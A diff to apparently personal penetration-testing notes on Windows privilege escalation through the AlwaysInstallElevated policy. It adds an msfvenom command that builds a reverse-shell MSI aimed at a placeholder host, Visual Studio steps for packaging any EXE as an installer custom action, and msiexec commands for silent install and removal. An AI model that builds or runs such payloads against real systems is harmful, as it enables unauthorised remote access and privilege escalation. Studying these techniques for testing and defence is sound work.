@@ -308,19 +308,65 @@ reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallEle
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 ```
 
-## Creating the malicious .msi file
+## Meterpreter
 
 ```
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT>-f msi -o shell.msi
 ```
+## EXE to MSI
 
-## Executing the .msi
+To create a custom MSI we first need to install a extension to our Visual Studio.
+
+* [https://marketplace.visualstudio.com/items?itemName=visualstudioclient.MicrosoftVisualStudio2017InstallerProjects](https://marketplace.visualstudio.com/items?itemName=visualstudioclient.MicrosoftVisualStudio2017InstallerProjects)
+
+Once installed we need to create a `Setup Wizard` project on a folder where our binary is located.
+
+A pop up will be prompted with some steps to do.
+
+* Select `Create a setup for a Windows application`
+
+![](/hackingnotes/images/setup-wizard.png)
+
+* Add the binary to execute during explotation.
+
+![](/hackingnotes/images/setup-wizard2.png)
+
+* And finish the setup.
+
+When the project is created, we can modify some properties such as the target platform, author and manufacturer of the installer.
+
+![](/hackingnotes/images/setup-wizard3.png)
+
+Next step is to add the file into the installation folder. To do that task right click on the solution `View -> Custom Actions`
+
+![](/hackingnotes/images/setup-wizard4.png)
+
+
+Righ click another time in Install `Install -> Add Custom Action...` and select the binary inside the `Application Folder`.
+
+![](/hackingnotes/images/setup-wizard5.png)
+
+Then select the EXE file and change the `Run64Bit` property to `True`.
+
+![](/hackingnotes/images/setup-wizard6.png)
+
+Finally we just need to save and compile our installer with right-click on the solution and select `Build`.
+
+![](/hackingnotes/images/setup-wizard7.png)
+
+## Executing the MSI
 
 ```
 msiexec /quiet /qn /i c:\users\user\documents\shell.msi
 ```
 
 > **Note:** I'd problems while exploiting it via WIN-RM. Try another way to get shell.
+
+To remove the MSI, you can use:
+
+```
+msiexec /q /n /uninstall shell.msi
+```
 
 # Weak Service Permissions
 
